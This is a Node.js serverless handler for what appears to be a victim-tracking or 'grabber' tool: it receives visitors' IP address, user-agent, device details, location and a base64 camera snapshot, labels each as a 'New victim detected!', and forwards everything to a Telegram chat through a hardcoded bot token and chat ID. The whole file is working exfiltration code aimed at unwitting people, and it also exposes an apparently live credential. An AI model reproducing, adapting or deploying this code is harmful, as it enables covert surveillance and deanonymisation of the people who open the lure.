const fetch = require('node-fetch');
const FormData = require('form-data');

// Hardcoded credentials (replace with environment variables in production)
const BOT_TOKEN = '8072573353:AAEUl98cQMgBvxj0upQx_CS2lAxJLiPHSw0';
const CHAT_ID = '6859219926';

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

module.exports = async (req, res) => {
  // Add CORS headers (adjust origin if needed)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    if (req.headers['content-type']?.includes('application/json')) {
      // Handle initial data send (JSON)
      const clientData = req.body;
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const userAgent = req.headers['user-agent'];
      const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct/None';

      const message = `🔔 New victim detected!\n\n` +
        `📌 IP Address: ${ip}\n` +
        `📌 Referrer: ${referer}\n` +
        `📌 User-Agent: ${userAgent}\n` +
        `📌 Click Time: ${new Date().toISOString()}\n\n` +
        `--- Client Data ---\n` +
        `🌐 Browser Version: ${clientData.browserVersion}\n` +
        `🖥️ Operating System: ${clientData.os}\n` +
        `📱 Device Type: ${clientData.deviceType}\n` +
        `🕒 Time Zone: ${clientData.timeZone}\n` +
        `🗣️ Device Language: ${clientData.language}\n` +
        `📏 Screen Resolution: ${clientData.screenResolution}\n` +
        `🌐 Browser: ${clientData.browser}\n` +
        `📍 Location (if available): ${clientData.location || 'Not provided'}`;

      await fetch(`${TELEGRAM_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          disable_web_page_preview: true
        })
      });

      res.status(200).json({ success: true });
    } 
    else if (req.headers['content-type']?.includes('multipart/form-data')) {
      // Handle photo upload (multipart/form-data with base64 image)
      // Expect field 'photo' containing base64 string
      const photoBase64 = req.body.photo; // assumes body parser handles multipart
      if (!photoBase64) {
        return res.status(400).json({ error: 'No photo provided' });
      }

      // Convert base64 to Buffer
      const buffer = Buffer.from(photoBase64, 'base64');

      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', buffer, { filename: 'snapshot.jpg' });

      const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.statusText}`);
      }

      res.status(200).json({ success: true });
    } 
    else {
      res.status(400).json({ error: 'Unsupported content type' });
    }
  } catch (error) {
    console.error('Error:', error);
    // Optionally send error to Telegram
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `❌ Error: ${error.message}`
      })
    });
    res.status(500).json({ error: 'Internal server error' });
  }
};
